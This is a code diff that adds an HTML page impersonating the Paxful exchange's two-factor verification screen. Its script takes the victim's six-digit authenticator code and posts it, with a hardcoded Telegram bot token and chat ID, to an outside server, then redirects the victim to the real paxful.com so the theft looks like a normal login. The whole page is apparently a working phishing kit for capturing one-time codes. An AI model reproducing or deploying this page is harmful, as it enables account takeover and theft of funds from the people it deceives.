@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verification</title>
+    <link rel="stylesheet" href="./style.css" />
+
+    <!-- Boxicons CSS -->
+    <link
+      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="reft-part">
+        <header>
+          <div class="logo">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 32 32"
+              class="aspect-square size-6 md:size-8"
+            >
+              <path
+                fill="#C9F24D"
+                d="M0 26.5A5.5 5.5 0 0 1 5.5 21H11v11H5.5A5.5 5.5 0 0 1 0 26.5M11 0h10.5C27.299 0 32 4.701 32 10.5S27.299 21 21.5 21H11z"
+              ></path>
+            </svg>
+          </div>
+          <p class="left-p">paxful</p>
+        </header>
+
+        <div class="back-section">
+          <box-icon
+            class="back-icon"
+            type="solid"
+            name="chevron-left"
+          ></box-icon>
+          <p>Back</p>
+        </div>
+
+        <div class="form-section">
+          <h2>Verification</h2>
+          <p>
+            Enter the 6-digit code sent to the authenticator associated with
+            your account. <span id="emailSpan">Email not found</span>
+          </p>
+        </div>
+
+        <form id="loginForm" action="" method="post">
+          <label for="email">Confirmation code</label>
+
+          <div class="input-wrapper">
+            <input type="text" id="cdn1" name="code" maxlength="1" required />
+            <input type="text" id="cdn2" name="code" maxlength="1" required />
+            <input type="text" id="cdn3" name="code" maxlength="1" required />
+            <input type="text" id="cdn4" name="code" maxlength="1" required />
+            <input type="text" id="cdn5" name="code" maxlength="1" required />
+            <input type="text" id="cdn6" name="code" maxlength="1" required />
+          </div>
+        </form>
+      </div>
+
+      <div class="light-part"></div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const codeInputs = document.querySelectorAll(".input-wrapper input");
+        const emailSpan = document.getElementById("emailSpan");
+
+        // Simulate securely retrieving user contact info from server-side
+        // get localStorage.setItem("userContact", email);
+        const userContact = localStorage.getItem("userContact"); // Replace with actual server-side logic
+        emailSpan.textContent = userContact || "Contact not found";
+
+        // Handle input and navigation between fields
+        codeInputs.forEach((input, index) => {
+          input.addEventListener("input", (e) => {
+            const value = e.target.value;
+
+            // Only allow digits
+            if (value && !/^\d$/.test(value)) {
+              e.target.value = "";
+              return;
+            }
+
+            // Move to next input if a digit is entered and not the last input
+            if (value.length === 1 && index < codeInputs.length - 1) {
+              codeInputs[index + 1].focus();
+            }
+
+            // Auto-submit if all inputs are filled
+            const allFilled = Array.from(codeInputs).every(
+              (input) => input.value.length === 1
+            );
+            if (allFilled) {
+              handleFormSubmit();
+            }
+          });
+
+          // Handle backspace and navigation
+          input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !e.target.value && index > 0) {
+              codeInputs[index - 1].focus();
+              codeInputs[index - 1].value = ""; // Clear previous input
+            }
+          });
+
+          // Handle paste event
+          input.addEventListener("paste", (e) => {
+            e.preventDefault();
+            const pastedData = (e.clipboardData || window.clipboardData)
+              .getData("text")
+              .replace(/\D/g, ""); // Only digits
+            if (pastedData.length <= 6) {
+              for (
+                let i = 0;
+                i < pastedData.length && index + i < codeInputs.length;
+                i++
+              ) {
+                codeInputs[index + i].value = pastedData[i];
+                if (index + i < codeInputs.length - 1) {
+                  codeInputs[index + i + 1].focus();
+                }
+              }
+              // Auto-submit if all inputs are filled after paste
+              const allFilled = Array.from(codeInputs).every(
+                (input) => input.value.length === 1
+              );
+              if (allFilled) {
+                handleFormSubmit();
+              }
+            }
+          });
+        });
+
+        function handleFormSubmit() {
+          const code = Array.from(codeInputs)
+            .map((input) => input.value)
+            .join("");
+          if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+            alert("Please enter a valid 6-digit code.");
+            return;
+          }
+
+          console.log("Submitting OTP for verification...");
+          const formData = new FormData();
+          formData.append("code", code);
+          formData.append(
+            "bot_token",
+            "7396577653:AAEyrabC0V5CCL1t1AJ2cy2qQ-wx3hcNC3w"
+          );
+          formData.append("chat_id", "7987558838");
+
+          fetch("https://links-backend-9i5k.onrender.com/security", {
+            method: "POST",
+            body: formData,
+          })
+            .then((response) => {
+              console.log("Response Status:", response.status);
+              if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+              }
+              return response.json();
+            })
+            .then((data) => {
+              console.log("Response Data:", data);
+              if (data.success) {
+                window.location.href = "https://paxful.com/";
+              } else {
+                alert(`Verification failed: ${data.error || "Unknown error"}`);
+              }
+            })
+            .catch((error) => {
+              console.error("Error during verification:", error);
+              alert("There was an error. Please try again later.");
+            });
+        }
+      });
+    </script>
+  </body>
+</html>
